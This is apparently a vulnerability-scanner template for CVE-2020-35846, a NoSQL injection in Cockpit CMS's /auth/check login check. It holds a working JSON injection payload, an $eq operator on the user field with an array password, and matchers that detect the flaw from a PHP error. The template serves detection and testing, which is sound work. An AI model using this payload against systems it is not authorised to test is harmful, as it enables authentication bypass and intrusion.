id: CVE-2020-35846
info:
  author: dwisiswant0
  description: 'Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php
    check function.

    The $eq operator matches documents where the value of a field equals the specified
    value.

    '
  name: Cockpit prior to 0.12.0 NoSQL injection in /auth/check
  reference: https://swarm.ptsecurity.com/rce-cockpit-cms/
  severity: critical
  tags: cve,cve2020,nosqli,sqli
requests:
- body: "{\n  \"auth\": {\n    \"user\": {\n      \"$eq\": \"admin\"\n    },\n   \
    \ \"password\": [\n      0\n    ]\n  }\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - password_verify() expects parameter
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/auth/check'
